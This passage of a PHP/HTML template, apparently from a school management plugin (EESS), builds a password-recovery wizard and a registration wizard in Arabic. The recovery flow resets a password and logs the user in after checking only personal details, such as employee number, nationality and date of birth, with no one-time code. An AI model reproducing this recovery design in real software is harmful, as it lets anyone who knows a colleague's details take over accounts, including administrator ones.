        </div>

        <!-- Multi-Step Password Recovery Modal Without OTP -->
        ' . (function() {
            $schools_list = SM_DB::get_schools() ?: array();
            $subjects_list = SM_DB::get_subjects() ?: array();
            $unique_subjects = array_unique(array_filter(array_map(function($s){ return is_object($s) ? $s->name : (is_array($s) ? ($s['name'] ?? '') : (string)$s); }, (array)$subjects_list)));
            $nationalities = array('إماراتي', 'سعودي', 'مصري', 'أردني', 'سوري', 'عماني', 'كويتي', 'بحريني', 'قطري', 'عراقي', 'يمني', 'سوداني', 'مغربي', 'جزائري', 'تونسية', 'لبناني', 'فلسطيني', 'جنسية أخرى');

            $schools_options = '';
            foreach ((array)$schools_list as $sch) {
                $sch_name = is_object($sch) ? $sch->name : (is_array($sch) ? ($sch['name'] ?? '') : (string)$sch);
                if ($sch_name) {
                    $schools_options .= '<option value="' . esc_attr($sch_name) . '">' . esc_html($sch_name) . '</option>';
                }
            }

            $subject_options = '';
            foreach ($unique_subjects as $subj) {
                if ($subj) {
                    $subject_options .= '<option value="' . esc_attr($subj) . '">' . esc_html($subj) . '</option>';
                }
            }

            $nationality_options = '';
            foreach ($nationalities as $nat) {
                $nationality_options .= '<option value="' . esc_attr($nat) . '">' . esc_html($nat) . '</option>';
            }

            return '
        <div id="eess-forgot-modal" class="eess-modal-overlay">
            <div class="eess-modal-dialog" style="max-width: 500px;">
                <div class="eess-modal-header">
                    <h3>التحقق من الهوية وإعادة تعيين كلمة المرور</h3>
                    <button type="button" class="eess-modal-close" onclick="eessCloseForgotModal()">&times;</button>
                </div>
                <div class="eess-modal-body">
                    <!-- Progress Bar Header -->
                    <div style="margin-bottom: 20px;">
                        <div style="display: flex; justify-content: space-between; font-size: 11px; font-weight: 800; color: #64748b; margin-bottom: 6px;">
                            <span id="eess-forgot-step-label">الخطوة 1 من 8: البريد الإلكتروني</span>
                            <span id="eess-forgot-step-pct">12%</span>
                        </div>
                        <div style="background: #e2e8f0; height: 6px; border-radius: 50px; overflow: hidden;">
                            <div id="eess-forgot-progress-bar" style="background: #2563eb; width: 12.5%; height: 100%; transition: width 0.3s ease;"></div>
                        </div>
                    </div>

                    <div id="eess-forgot-msg" class="eess-modal-msg"></div>

                    <!-- Step 1: Email -->
                    <div id="eess-forgot-step-1" class="eess-wizard-step active">
                        <p style="font-size: 13px; color: #64748b; margin-bottom: 15px; line-height: 1.6;">الخطوة الأولى: أدخل البريد الإلكتروني المعتمد والمثبت بحسابك في النظام.</p>
                        <div class="eess-form-group">
                            <div class="eess-float-container">
                                <input type="email" id="eess-forgot-email" class="eess-float-input" placeholder=" ">
                                <label for="eess-forgot-email" class="eess-float-label">البريد الإلكتروني المعتمد *</label>
                            </div>
                        </div>
                        <div style="display: flex; justify-content: flex-end; margin-top: 15px;">
                            <button type="button" onclick="eessNextForgotStep(2)" class="eess-btn-login" style="width: auto; height: 38px; padding: 0 20px; font-size: 0.85rem;">المتابعة للخطوة التالية &larr;</button>
                        </div>
                    </div>

                    <!-- Step 2: Employee ID -->
                    <div id="eess-forgot-step-2" class="eess-wizard-step">
                        <p style="font-size: 13px; color: #64748b; margin-bottom: 15px; line-height: 1.6;">الخطوة الثانية: أدخل الرقم الوظيفي / رقم الموظف الخاص بك المسجل بالنظام.</p>
                        <div class="eess-form-group">
                            <div class="eess-float-container">
                                <input type="text" id="eess-forgot-empid" class="eess-float-input" placeholder=" ">
                                <label for="eess-forgot-empid" class="eess-float-label">الرقم الوظيفي / Job Number *</label>
                            </div>
                        </div>
                        <div style="display: flex; justify-content: space-between; margin-top: 15px;">
                            <button type="button" onclick="eessPrevForgotStep(1)" class="eess-btn-reset-pwd" style="width: auto; height: 38px; padding: 0 16px; font-size: 0.85rem; background: #64748b !important;">&rarr; السابق</button>
                            <button type="button" onclick="eessNextForgotStep(3)" class="eess-btn-login" style="width: auto; height: 38px; padding: 0 20px; font-size: 0.85rem;">المتابعة للخطوة التالية &larr;</button>
                        </div>
                    </div>

                    <!-- Step 3: Institution / School -->
                    <div id="eess-forgot-step-3" class="eess-wizard-step">
                        <p style="font-size: 13px; color: #64748b; margin-bottom: 15px; line-height: 1.6;">الخطوة الثالثة: اختر اسم المؤسسة أو المدرسة التي تعمل بها بجدول النظام.</p>
                        <div class="eess-form-group">
                            <select id="eess-forgot-institution" class="eess-float-input" style="height: 44px; padding: 0 12px; font-size: 13px; font-weight: 700;">
                                <option value="">-- اختر المدرسة / المؤسسة --</option>
                                <option value="خدمات الأنظمة الإلكترونية التعليمية (EESS)">خدمات الأنظمة الإلكترونية التعليمية (EESS)</option>
                                ' . $schools_options . '
                            </select>
                        </div>
                        <div style="display: flex; justify-content: space-between; margin-top: 15px;">
                            <button type="button" onclick="eessPrevForgotStep(2)" class="eess-btn-reset-pwd" style="width: auto; height: 38px; padding: 0 16px; font-size: 0.85rem; background: #64748b !important;">&rarr; السابق</button>
                            <button type="button" onclick="eessNextForgotStep(4)" class="eess-btn-login" style="width: auto; height: 38px; padding: 0 20px; font-size: 0.85rem;">المتابعة للخطوة التالية &larr;</button>
                        </div>
                    </div>

                    <!-- Step 4: Nationality -->
                    <div id="eess-forgot-step-4" class="eess-wizard-step">
                        <p style="font-size: 13px; color: #64748b; margin-bottom: 15px; line-height: 1.6;">الخطوة الرابعة: اختر جنسيتك المسجلة بملفك الأكاديمي.</p>
                        <div class="eess-form-group">
                            <select id="eess-forgot-nationality" class="eess-float-input" style="height: 44px; padding: 0 12px; font-size: 13px; font-weight: 700;">
                                <option value="">-- اختر الجنسية --</option>
                                ' . $nationality_options . '
                            </select>
                        </div>
                        <div style="display: flex; justify-content: space-between; margin-top: 15px;">
                            <button type="button" onclick="eessPrevForgotStep(3)" class="eess-btn-reset-pwd" style="width: auto; height: 38px; padding: 0 16px; font-size: 0.85rem; background: #64748b !important;">&rarr; السابق</button>
                            <button type="button" onclick="eessNextForgotStep(5)" class="eess-btn-login" style="width: auto; height: 38px; padding: 0 20px; font-size: 0.85rem;">المتابعة للخطوة التالية &larr;</button>
                        </div>
                    </div>

                    <!-- Step 5: Role -->
                    <div id="eess-forgot-step-5" class="eess-wizard-step">
                        <p style="font-size: 13px; color: #64748b; margin-bottom: 15px; line-height: 1.6;">الخطوة الخامسة: اختر الرتبة الوظيفية الخاصة بك بالنظام.</p>
                        <div class="eess-form-group">
                            <select id="eess-forgot-role" class="eess-float-input" onchange="eessCheckRoleSubjectNeed()" style="height: 44px; padding: 0 12px; font-size: 13px; font-weight: 700;">
                                <option value="">-- اختر الرتبة الوظيفية --</option>
                                <option value="sm_teacher">معلم (Teacher)</option>
                                <option value="sm_coordinator">منسق مادة (Subject Coordinator)</option>
                                <option value="sm_hod">رئيس قسم (Department Head)</option>
                                <option value="sm_supervisor">مشرف تربوي (Educational Supervisor)</option>
                                <option value="sm_principal">مدير المدرسة (School Manager)</option>
                                <option value="sm_discipline_supervisor">مشرف سلوك / انضباط</option>
                                <option value="sm_activities_supervisor">مشرف أنشطة</option>
                                <option value="sm_transportation_supervisor">مشرف نقل ومواصلات</option>
                                <option value="sm_system_admin">مدير النظام (System Admin)</option>
                            </select>
                        </div>
                        <div style="display: flex; justify-content: space-between; margin-top: 15px;">
                            <button type="button" onclick="eessPrevForgotStep(4)" class="eess-btn-reset-pwd" style="width: auto; height: 38px; padding: 0 16px; font-size: 0.85rem; background: #64748b !important;">&rarr; السابق</button>
                            <button type="button" onclick="eessNextForgotStep(6)" class="eess-btn-login" style="width: auto; height: 38px; padding: 0 20px; font-size: 0.85rem;">المتابعة للخطوة التالية &larr;</button>
                        </div>
                    </div>

                    <!-- Step 6: Subject (Auto-skipped if not applicable) -->
                    <div id="eess-forgot-step-6" class="eess-wizard-step">
                        <p style="font-size: 13px; color: #64748b; margin-bottom: 15px; line-height: 1.6;">الخطوة السادسة: حدد المادة الدراسية المسندة لتدريسها.</p>
                        <div class="eess-form-group">
                            <select id="eess-forgot-subject" class="eess-float-input" style="height: 44px; padding: 0 12px; font-size: 13px; font-weight: 700;">
                                <option value="">-- اختر المادة الدراسية --</option>
                                ' . $subject_options . '
                            </select>
                        </div>
                        <div style="display: flex; justify-content: space-between; margin-top: 15px;">
                            <button type="button" onclick="eessPrevForgotStep(5)" class="eess-btn-reset-pwd" style="width: auto; height: 38px; padding: 0 16px; font-size: 0.85rem; background: #64748b !important;">&rarr; السابق</button>
                            <button type="button" onclick="eessNextForgotStep(7)" class="eess-btn-login" style="width: auto; height: 38px; padding: 0 20px; font-size: 0.85rem;">المتابعة للخطوة التالية &larr;</button>
                        </div>
                    </div>

                    <!-- Step 7: Date of Birth -->
                    <div id="eess-forgot-step-7" class="eess-wizard-step">
                        <p style="font-size: 13px; color: #64748b; margin-bottom: 15px; line-height: 1.6;">الخطوة السابعة: أدخل تاريخ الميلاد الخاص بك المكتوب بسجلك الرسمي.</p>
                        <div class="eess-form-group">
                            <input type="date" id="eess-forgot-dob" class="eess-float-input" style="height: 44px; padding: 0 12px; font-size: 13px; font-weight: 700;">
                        </div>
                        <div style="display: flex; justify-content: space-between; margin-top: 15px;">
                            <button type="button" onclick="eessPrevForgotStep(6)" class="eess-btn-reset-pwd" style="width: auto; height: 38px; padding: 0 16px; font-size: 0.85rem; background: #64748b !important;">&rarr; السابق</button>
                            <button type="button" onclick="eessVerifyIdentityFull()" id="btn-verify-identity" class="eess-btn-login" style="width: auto; height: 38px; padding: 0 20px; font-size: 0.85rem; background: #16a34a !important;">التحقق الأمني من الهوية &larr;</button>
                        </div>
                    </div>

                    <!-- Step 8: Create New Password -->
                    <div id="eess-forgot-step-8" class="eess-wizard-step">
                        <div style="background: #f0fdf4; border: 1px solid #bbf7d0; padding: 12px; border-radius: 8px; margin-bottom: 15px;">
                            <h4 id="eess-forgot-welcome-msg" style="margin: 0; color: #166534; font-weight: 800; font-size: 13px;">تم تأكيد الهوية بنجاح!</h4>
                            <p style="margin: 4px 0 0 0; font-size: 11px; color: #15803d; line-height: 1.5;">أنشئ كلمة المرور الجديدة لتسجيل دخولك التلقائي المباشر للنظام.</p>
                        </div>

                        <!-- Live Password Rules List -->
                        <div style="background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 8px; padding: 10px 12px; margin-bottom: 15px; font-size: 11px;">
                            <div style="font-weight: 800; color: #334155; margin-bottom: 4px;">شروط كلمة المرور المطلوبة:</div>
                            <div id="pwd-rule-len" style="color: #64748b;">• الطول بين 8 و 40 خانة</div>
                            <div id="pwd-rule-upper" style="color: #64748b;">• حرف إنجليزي كبير (A-Z) واحد على الأقل</div>
                            <div id="pwd-rule-lower" style="color: #64748b;">• حرف إنجليزي صغير (a-z) واحد على الأقل</div>
                            <div id="pwd-rule-num" style="color: #64748b;">• رقم (0-9) واحد على الأقل</div>
                        </div>

                        <div style="display: flex; flex-direction: column; gap: 12px; margin-bottom: 15px;">
                            <div class="eess-form-group" style="margin-bottom: 0;">
                                <div class="eess-float-container eess-password-wrapper">
                                    <input type="password" id="eess-forgot-pass" class="eess-float-input" placeholder=" " maxlength="40" oninput="eessLiveCheckPassword()">
                                    <label for="eess-forgot-pass" class="eess-float-label">كلمة المرور الجديدة *</label>
                                    <button type="button" class="eess-toggle-eye" onclick="eessTogglePassVisibility(\'eess-forgot-pass\', this)">
                                        <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
                                    </button>
                                </div>
                            </div>
                            <div class="eess-form-group" style="margin-bottom: 0;">
                                <div class="eess-float-container eess-password-wrapper">
                                    <input type="password" id="eess-forgot-pass-conf" class="eess-float-input" placeholder=" " maxlength="40" oninput="eessLiveCheckPassword()">
                                    <label for="eess-forgot-pass-conf" class="eess-float-label">تأكيد كلمة المرور *</label>
                                    <button type="button" class="eess-toggle-eye" onclick="eessTogglePassVisibility(\'eess-forgot-pass-conf\', this)">
                                        <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
                                    </button>
                                </div>
                            </div>
                        </div>

                        <div style="display: flex; justify-content: flex-end;">
                            <button type="button" onclick="eessSetNewPasswordAndLogin()" id="btn-save-new-pass" class="eess-btn-login" style="width: 100%; height: 42px; font-size: 0.9rem; background: #2563eb !important;">حفظ كلمة المرور والدخول المباشر للنظام</button>
                        </div>
                    </div>

                    <!-- Support Card Inside Modal -->
                    <div style="margin-top: 20px; padding-top: 15px; border-top: 1px solid #f1f5f9; font-size: 11px; color: #64748b; line-height: 1.6;">
                        💬 إذا واجهت أي صعوبة في الدخول أو استعادة حسابك، يرجى الاتصال بقسم الدعم الفني لشركة EESS عبر البريد الرسمي <a href="mailto:info@eess.online" style="color: #8b1e1e; font-weight: bold; text-decoration: underline;">info@eess.online</a>.
                    </div>
                </div>
            </div>
        </div>';
        })() . '

        <!-- Help & Support Modal -->
        <div id="eess-support-modal" class="eess-modal-overlay">
            <div class="eess-modal-dialog" style="max-width: 450px;">
                <div class="eess-modal-header">
                    <h3>المساعدة والدعم الفني</h3>
                    <button type="button" class="eess-modal-close" onclick="eessCloseSupportModal()">&times;</button>
                </div>
                <div class="eess-modal-body">
                    <p style="font-size: 13px; color: #334155; line-height: 1.8; margin-top: 0;">إذا كنت تواجه أي صعوبة في الدخول إلى حسابك أو استعادة كلمة المرور، يرجى التكرم بمراسلة إدارة المنصة عبر البريد الإلكتروني الرسمي مباشرة:</p>
                    <div style="background: #f8fafc; border: 1px solid #cbd5e1; padding: 15px; border-radius: 8px; text-align: center; margin: 15px 0;">
                        <a href="mailto:info@eess.online" style="color: #8b1e1e; font-weight: bold; font-size: 16px; text-decoration: none;">info@eess.online</a>
                    </div>
                    <p style="font-size: 12px; color: #64748b; line-height: 1.6;">سوف يقوم مهندسو الدعم الفني بالرد عليك وحل المشكلة في أقرب وقت ممكن.</p>
                </div>
            </div>
        </div>

        <!-- Registration Wizard Modal (Without OTP) -->
        ' . (function() {
            $insts_list = class_exists('EESS_Org_Helper') ? EESS_Org_Helper::get_institutions() : array();
            $subjects_list = SM_DB::get_subjects() ?: array();
            $unique_subjects = array_unique(array_filter(array_map(function($s){ return is_object($s) ? $s->name : (is_array($s) ? ($s['name'] ?? '') : (string)$s); }, (array)$subjects_list)));
            $nationalities = array('إماراتي', 'سعودي', 'مصري', 'أردني', 'سوري', 'عماني', 'كويتي', 'بحريني', 'قطري', 'عراقي', 'يمني', 'سوداني', 'مغربي', 'جزائري', 'تونسية', 'لبناني', 'فلسطيني', 'جنسية أخرى');

            $schools_opts = '';
            foreach ((array)$insts_list as $inst_item) {
                $inst_name = is_object($inst_item) ? $inst_item->name : (is_array($inst_item) ? ($inst_item['name'] ?? '') : (string)$inst_item);
                if ($inst_name) {
                    $schools_opts .= '<option value="' . esc_attr($inst_name) . '">' . esc_html($inst_name) . '</option>';
                }
            }

            $subject_opts = '';
            foreach ($unique_subjects as $subj) {
                if ($subj) {
                    $subject_opts .= '<option value="' . esc_attr($subj) . '">' . esc_html($subj) . '</option>';
                }
            }

            $nat_opts = '';
            foreach ($nationalities as $nat) {
                $nat_opts .= '<option value="' . esc_attr($nat) . '">' . esc_html($nat) . '</option>';
            }

            return '
        <div id="eess-register-modal" class="eess-modal-overlay">
            <div class="eess-modal-dialog" style="max-width: 520px;">
                <div class="eess-modal-header">
                    <h3>طلب تسجيل حساب جديد (قيد مراجعة الإدارة)</h3>
                    <button type="button" class="eess-modal-close" onclick="eessCloseRegisterModal()">&times;</button>
                </div>
                <div class="eess-modal-body">
                    <!-- Step Progress Bar -->
                    <div class="eess-step-progress-bar">
                        <div class="eess-step-node active" id="node-1">1</div>
                        <div class="eess-step-node" id="node-2">2</div>
                        <div class="eess-step-node" id="node-3">3</div>
                        <div class="eess-step-node" id="node-4">4</div>
                        <div class="eess-step-node" id="node-5">5</div>
                    </div>

                    <div id="eess-register-msg" class="eess-modal-msg"></div>

                    <!-- Step 1: Personal Info -->
                    <div id="eess-reg-step-1" class="eess-wizard-step active">
                        <p style="font-size: 13px; color: #64748b; margin-bottom: 15px; line-height: 1.6;">الخطوة الأولى: أدخل الاسم الثلاثي، تاريخ الميلاد والجنسية.</p>
                        <div style="display: flex; gap: 12px; margin-bottom: 14px;">
                            <div class="eess-form-group" style="flex: 1; margin-bottom: 0;">
                                <div class="eess-float-container">
                                    <input type="text" id="eess-reg-first-name" class="eess-float-input" placeholder=" ">
                                    <label for="eess-reg-first-name" class="eess-float-label">الاسم الأول *</label>
                                </div>
                            </div>
                            <div class="eess-form-group" style="flex: 1; margin-bottom: 0;">
                                <div class="eess-float-container">
                                    <input type="text" id="eess-reg-last-name" class="eess-float-input" placeholder=" ">
                                    <label for="eess-reg-last-name" class="eess-float-label">اسم العائلة *</label>
                                </div>
                            </div>
                        </div>
                        <div style="display: flex; gap: 12px; margin-bottom: 14px;">
                            <div class="eess-form-group" style="flex: 1; margin-bottom: 0;">
                                <label style="display: block; font-size: 11px; font-weight: 700; color: #64748b; margin-bottom: 4px;">تاريخ الميلاد *</label>
                                <input type="date" id="eess-reg-dob" class="eess-form-input" style="height: 42px; padding: 0 10px; font-size: 13px; font-weight: 700;">
                            </div>
                            <div class="eess-form-group" style="flex: 1; margin-bottom: 0;">
                                <label style="display: block; font-size: 11px; font-weight: 700; color: #64748b; margin-bottom: 4px;">الجنسية *</label>
                                <select id="eess-reg-nationality" class="eess-form-input" style="height: 42px; padding: 0 10px; font-size: 13px; font-weight: 700;">
                                    <option value="">-- اختر الجنسية --</option>
                                    ' . $nat_opts . '
                                </select>
                            </div>
                        </div>
                        <div style="display: flex; justify-content: flex-end; margin-top: 20px;">
                            <button type="button" onclick="eessGoToRegStep(2)" class="eess-btn-login" style="width: auto; height: 38px; padding: 0 20px; font-size: 0.85rem;">المتابعة للخطوة التالية &larr;</button>
                        </div>
                    </div>

                    <!-- Step 2: Contact Info -->
                    <div id="eess-reg-step-2" class="eess-wizard-step">
                        <p style="font-size: 13px; color: #64748b; margin-bottom: 15px; line-height: 1.6;">الخطوة الثانية: أدخل بريدك الإلكتروني الرسمي ورقم الهاتف.</p>
                        <div class="eess-form-group" style="margin-bottom: 14px;">
                            <div class="eess-float-container">
                                <input type="email" id="eess-reg-email" class="eess-float-input" placeholder=" ">
                                <label for="eess-reg-email" class="eess-float-label">البريد الإلكتروني الرسمي *</label>
                            </div>
                        </div>
                        <div class="eess-form-group" style="margin-bottom: 14px;">
                            <div class="eess-float-container">
                                <input type="text" id="eess-reg-phone" class="eess-float-input" placeholder=" ">
                                <label for="eess-reg-phone" class="eess-float-label">رقم الهاتف والتواصل *</label>
                            </div>
                        </div>
                        <div style="display: flex; justify-content: space-between; margin-top: 20px;">
                            <button type="button" onclick="eessGoToRegStep(1)" class="eess-btn-reset-pwd" style="width: auto; height: 38px; padding: 0 16px; font-size: 0.85rem; background: #64748b !important;">&rarr; السابق</button>
                            <button type="button" onclick="eessGoToRegStep(3)" class="eess-btn-login" style="width: auto; height: 38px; padding: 0 20px; font-size: 0.85rem;">المتابعة للخطوة التالية &larr;</button>
                        </div>
                    </div>

                    <!-- Step 3: Employment & Institution -->
                    <div id="eess-reg-step-3" class="eess-wizard-step">
                        <p style="font-size: 13px; color: #64748b; margin-bottom: 15px; line-height: 1.6;">الخطوة الثالثة: أدخل الرقم الوظيفي واختر المؤسسة/المدرسة.</p>
                        <div class="eess-form-group" style="margin-bottom: 14px;">
                            <div class="eess-float-container">
                                <input type="text" id="eess-reg-emp-num" class="eess-float-input" placeholder=" ">
                                <label for="eess-reg-emp-num" class="eess-float-label">الرقم الوظيفي / رقم الموظف *</label>
                            </div>
                        </div>
                        <div class="eess-form-group" style="margin-bottom: 14px;">
                            <label style="display: block; font-size: 11px; font-weight: 700; color: #64748b; margin-bottom: 4px;">المؤسسة / المدرسة *</label>
                            <select id="eess-reg-institution" class="eess-form-input" style="height: 42px; padding: 0 10px; font-size: 13px; font-weight: 700;">
                                <option value="خدمات الأنظمة الإلكترونية التعليمية (EESS)">خدمات الأنظمة الإلكترونية التعليمية (EESS)</option>
                                ' . $schools_opts . '
                            </select>
                        </div>
                        <div style="display: flex; justify-content: space-between; margin-top: 20px;">
                            <button type="button" onclick="eessGoToRegStep(2)" class="eess-btn-reset-pwd" style="width: auto; height: 38px; padding: 0 16px; font-size: 0.85rem; background: #64748b !important;">&rarr; السابق</button>
                            <button type="button" onclick="eessGoToRegStep(4)" class="eess-btn-login" style="width: auto; height: 38px; padding: 0 20px; font-size: 0.85rem;">المتابعة للخطوة التالية &larr;</button>
                        </div>
                    </div>

                    <!-- Step 4: Role & Subject -->
                    <div id="eess-reg-step-4" class="eess-wizard-step">
                        <p style="font-size: 13px; color: #64748b; margin-bottom: 15px; line-height: 1.6;">الخطوة الرابعة: اختر الرتبة الوظيفية والمادة المسندة.</p>
                        <div class="eess-form-group" style="margin-bottom: 14px;">
                            <label style="display: block; font-size: 11px; font-weight: 700; color: #64748b; margin-bottom: 4px;">الرتبة الوظيفية المطلوب تسجيلها *</label>
                            <select id="eess-reg-role" class="eess-form-input" onchange="eessOnRegRoleChange()" style="height: 42px; padding: 0 10px; font-size: 13px; font-weight: 700;">
                                <option value="sm_teacher">معلم (Teacher)</option>
                                <option value="sm_coordinator">منسق مادة (Subject Coordinator)</option>
                                <option value="sm_hod">رئيس قسم (Department Head)</option>
                                <option value="sm_supervisor">مشرف تربوي (Educational Supervisor)</option>
                                <option value="sm_principal">مدير المدرسة (School Manager)</option>
                                <option value="sm_discipline_supervisor">مشرف سلوك / انضباط</option>
                                <option value="sm_activities_supervisor">مشرف أنشطة</option>
                                <option value="sm_transportation_supervisor">مشرف نقل ومواصلات</option>
                                <option value="sm_bus_supervisor">مشرف حافلة</option>
                                <option value="sm_clinic">العيادة المدرسية</option>
                                <option value="sm_parent">ولي أمر (Parent)</option>
                            </select>
                        </div>
                        <div class="eess-form-group" id="eess-reg-subject-box" style="margin-bottom: 14px;">
                            <label style="display: block; font-size: 11px; font-weight: 700; color: #64748b; margin-bottom: 4px;">المادة الدراسية المسندة *</label>
                            <select id="eess-reg-subject" class="eess-form-input" style="height: 42px; padding: 0 10px; font-size: 13px; font-weight: 700;">
                                <option value="">-- اختر المادة --</option>
                                ' . $subject_opts . '
                            </select>
                        </div>
                        <div style="display: flex; justify-content: space-between; margin-top: 20px;">
                            <button type="button" onclick="eessGoToRegStep(3)" class="eess-btn-reset-pwd" style="width: auto; height: 38px; padding: 0 16px; font-size: 0.85rem; background: #64748b !important;">&rarr; السابق</button>
                            <button type="button" onclick="eessGoToRegStep(5)" class="eess-btn-login" style="width: auto; height: 38px; padding: 0 20px; font-size: 0.85rem;">المتابعة للخطوة الأخيرة &larr;</button>
                        </div>
                    </div>

                    <!-- Step 5: Review & Password Creation -->
                    <div id="eess-reg-step-5" class="eess-wizard-step">
                        <p style="font-size: 13px; color: #64748b; margin-bottom: 15px; line-height: 1.6;">الخطوة الخامسة: أنشئ كلمة المرور وراجع البيانات قبل الإرسال.</p>

                        <!-- Summary Card -->
                        <div id="eess-reg-summary-card" style="background: #f8fafc; border: 1px solid #cbd5e1; border-radius: 8px; padding: 12px; margin-bottom: 15px; font-size: 11px; line-height: 1.7; color: #334155;"></div>

                        <div style="display: flex; gap: 12px; margin-bottom: 16px;">
                            <div class="eess-form-group" style="flex: 1; margin-bottom: 0;">
                                <div class="eess-float-container eess-password-wrapper">
                                    <input type="password" id="eess-reg-pass" class="eess-float-input" placeholder=" " maxlength="40">
                                    <label for="eess-reg-pass" class="eess-float-label">كلمة المرور *</label>
                                    <button type="button" class="eess-toggle-eye" onclick="eessTogglePassVisibility(\'eess-reg-pass\', this)">
                                        <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
                                    </button>
                                </div>
                            </div>
                            <div class="eess-form-group" style="flex: 1; margin-bottom: 0;">
                                <div class="eess-float-container eess-password-wrapper">
                                    <input type="password" id="eess-reg-pass-conf" class="eess-float-input" placeholder=" " maxlength="40">
                                    <label for="eess-reg-pass-conf" class="eess-float-label">تأكيد كلمة المرور *</label>
                                    <button type="button" class="eess-toggle-eye" onclick="eessTogglePassVisibility(\'eess-reg-pass-conf\', this)">
                                        <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
                                    </button>
                                </div>
                            </div>
                        </div>

                        <div style="display: flex; justify-content: space-between; margin-top: 20px;">
                            <button type="button" onclick="eessGoToRegStep(4)" class="eess-btn-reset-pwd" style="width: auto; height: 38px; padding: 0 16px; font-size: 0.85rem; background: #64748b !important;">&rarr; السابق</button>
                            <button type="button" id="btn-submit-reg-final" onclick="eessRegisterSubmitFinal()" class="eess-btn-login" style="width: auto; height: 38px; padding: 0 20px; font-size: 0.85rem; background: #16a34a !important;">إرسال طلب التسجيل للإدارة</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>';
        })() . '

        <!-- Custom JS Client logic for Password Recovery and Registration -->
        <script>
        function eessShowForgotMsg(text, isError) {
            const el = document.getElementById(\'eess-forgot-msg\');
            el.innerText = text;
            el.style.display = \'block\';
            if (isError) {
                el.className = \'eess-modal-msg error\';
            } else {
                el.className = \'eess-modal-msg success\';
            }
        }

        function eessShowRegMsg(text, isError) {
            const el = document.getElementById(\'eess-register-msg\');
            el.innerText = text;
            el.style.display = \'block\';
            if (isError) {
                el.className = \'eess-modal-msg error\';
            } else {
                el.className = \'eess-modal-msg success\';
            }
        }

        // Modal triggers
        function eessOpenForgotModal() {
            document.getElementById(\'eess-forgot-modal\').style.display = \'flex\';
            eessGoToForgotStep(1);
        }
        function eessCloseForgotModal() {
            document.getElementById(\'eess-forgot-modal\').style.display = \'none\';
        }

        function eessOpenSupportModal() {
            document.getElementById(\'eess-support-modal\').style.display = \'flex\';
        }
        function eessCloseSupportModal() {
            document.getElementById(\'eess-support-modal\').style.display = \'none\';
        }

        function eessOpenRegisterModal() {
            document.getElementById(\'eess-register-modal\').style.display = \'flex\';
            eessGoToRegStep(1);
        }
        function eessCloseRegisterModal() {
            document.getElementById(\'eess-register-modal\').style.display = \'none\';
        }

        let eessVerifiedResetToken = \'\';

        // Recovery Step Wizard Navigation & Validation
        function eessCheckRoleSubjectNeed() {
            const role = document.getElementById(\'eess-forgot-role\').value;
            // Role requires subject if teacher, coordinator, HOD
            return (role === \'sm_teacher\' || role === \'sm_coordinator\' || role === \'sm_hod\');
        }

        function eessGoToForgotStep(stepNum) {
            document.getElementById(\'eess-forgot-msg\').style.display = \'none\';

            // Auto skip step 6 (Subject) if role does not require subject
            if (stepNum === 6 && !eessCheckRoleSubjectNeed()) {
                stepNum = 7;
            }

            for (let i = 1; i <= 8; i++) {
                const el = document.getElementById(\'eess-forgot-step-\' + i);
                if (el) el.style.display = (i === stepNum) ? \'block\' : \'none\';
            }

            // Update Progress Bar & Header
            const stepLabels = {
                1: \'الخطوة 1 من 8: البريد الإلكتروني\',
                2: \'الخطوة 2 من 8: الرقم الوظيفي\',
                3: \'الخطوة 3 من 8: المؤسسة / المدرسة\',
                4: \'الخطوة 4 من 8: الجنسية\',
                5: \'الخطوة 5 من 8: الرتبة الوظيفية\',
                6: \'الخطوة 6 من 8: المادة الدراسية\',
                7: \'الخطوة 7 من 8: تاريخ الميلاد\',
                8: \'الخطوة 8 من 8: تعيين كلمة المرور الجديدة\'
            };

            const pct = Math.round((stepNum / 8) * 100);
            document.getElementById(\'eess-forgot-step-label\').innerText = stepLabels[stepNum] || \'\';
            document.getElementById(\'eess-forgot-step-pct\').innerText = pct + \'%\';
            document.getElementById(\'eess-forgot-progress-bar\').style.width = pct + \'%\';
        }

        function eessNextForgotStep(nextStep) {
            document.getElementById(\'eess-forgot-msg\').style.display = \'none\';

            // Validate Current Step Before Advancing
            if (nextStep === 2) {
                const email = document.getElementById(\'eess-forgot-email\').value.trim();
                if (!email || !email.includes(\'@\')) {
                    eessShowForgotMsg(\'يرجى إدخال بريد إلكتروني صحيح.\', true);
                    return;
                }
            } else if (nextStep === 3) {
                const empId = document.getElementById(\'eess-forgot-empid\').value.trim();
                if (!empId) {
                    eessShowForgotMsg(\'يرجى إدخال الرقم الوظيفي الخاص بك.\', true);
                    return;
                }
            } else if (nextStep === 4) {
                const inst = document.getElementById(\'eess-forgot-institution\').value;
                if (!inst) {
                    eessShowForgotMsg(\'يرجى اختيار المؤسسة أو المدرسة التابع لها.\', true);
                    return;
                }
            } else if (nextStep === 5) {
                const nat = document.getElementById(\'eess-forgot-nationality\').value;
                if (!nat) {
